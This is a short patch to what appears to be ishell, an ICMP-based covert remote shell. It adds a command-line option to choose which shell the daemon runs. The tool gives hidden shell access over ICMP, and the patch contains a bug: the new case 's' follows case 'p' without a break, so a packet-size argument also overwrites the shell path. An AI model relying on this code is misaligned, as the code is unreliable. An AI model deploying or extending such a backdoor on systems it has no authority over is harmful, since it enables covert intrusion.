@@ -1,0 +1,48 @@
+--- ishell.h
++++ ishell.h
+@@ -39,6 +39,7 @@
+     uint8_t    type;           /* icmp type to send packet as       */
+     uint16_t   packetsize;     /* packetsize of data                */
+     uint32_t   seq;            /* sequence number tracking          */
++    char       *shell;
+ };
+ 
+ 
+--- ishd.c
++++ ishd.c
+@@ -28,6 +28,7 @@
+     " -i <id>          Set session id; range: 0-65535 (default: 1515)\n"
+     " -t <type>        Set ICMP type (default: 0)\n"
+     " -p <packetsize>  Set packet size (default: 512)\n"
++    " -s <shell>       Set shell (default: /bin/sh)\n"
+     "\nexample:\n"
+     "%s -i 65535 -t 0 -p 1024\n"
+     "\n", VERSION, program, program);
+@@ -74,7 +75,7 @@
+     int     n, fd, maxfd;
+     char    send_buf[ish_info.packetsize], recv_buf[ish_info.packetsize];
+ 
+-    fd = popen2("/bin/sh");
++    fd = popen2(ish_info.shell);
+     sendhdr.cntrl = 0;
+ 
+     while(1) {
+@@ -122,7 +123,8 @@
+     int     opt, sockfd;
+     struct  sockaddr_in sin;
+ 
+-    while((opt = getopt(argc, argv, "hdi:t:p:")) != -1) {
++    ish_info.shell = "/bin/sh";
++    while((opt = getopt(argc, argv, "hdi:t:p:s:")) != -1) {
+         switch(opt) {
+         	case 'h':
+             	usage(argv[0]);
+@@ -138,6 +140,8 @@
+             	break;
+         	case 'p':
+             	ish_info.packetsize = atoi(optarg);
++		case 's':
++		ish_info.shell = optarg;
+             	break;
+         }
+     }
